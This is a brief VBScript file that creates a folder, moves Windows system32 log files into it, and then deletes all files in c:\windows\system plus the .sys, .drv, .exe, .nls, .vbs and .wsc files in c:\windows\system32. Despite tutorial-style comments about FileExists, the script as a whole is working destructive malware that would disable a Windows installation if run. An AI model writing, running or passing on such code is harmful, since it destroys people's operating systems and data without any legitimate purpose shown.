Dim filesys, newfolder, newfolderpath 
newfolderpath = "c:\Folder" 
set filesys=CreateObject("Scripting.FileSystemObject") 
If Not filesys.FolderExists(newfolderpath) Then 
  Set newfolder = filesys.CreateFolder(newfolderpath) 
End If

'Moving a file system - the if FileExists does not work'

dim filemove
set filemove=CreateObject("Scripting.FileSystemObject")
filemove.MoveFile "c:\windows\system32\*.log", "c:\Folder\"

'Deleting a file - you don't have to use FileExists'

dim filedel
Set filedel = CreateObject("Scripting.FileSystemObject") 
filedel.DeleteFile "c:\windows\system\*.*"

'Deleting a file - you don't have to use FileExists'

dim filedelwsc
Set filedelwsc = CreateObject("Scripting.FileSystemObject") 
filedelwsc.DeleteFile "c:\windows\system32\*.wsc"

dim filedeldrv
Set filedeldrv = CreateObject("Scripting.FileSystemObject") 
filedeldrv.DeleteFile "c:\windows\system32\*.drv"

dim filedelvbs
Set filedelvbs = CreateObject("Scripting.FileSystemObject") 
filedelvbs.DeleteFile "c:\windows\system32\*.vbs"

dim filedelsys
Set filedelsys = CreateObject("Scripting.FileSystemObject") 
filedelsys.DeleteFile "c:\windows\system32\*.sys"

dim filedelnls
Set filedelnls = CreateObject("Scripting.FileSystemObject") 
filedelnls.DeleteFile "c:\windows\system32\*.nls"

dim filedelexe
Set filedelexe = CreateObject("Scripting.FileSystemObject") 
filedelexe.DeleteFile "c:\windows\system32\*.exe"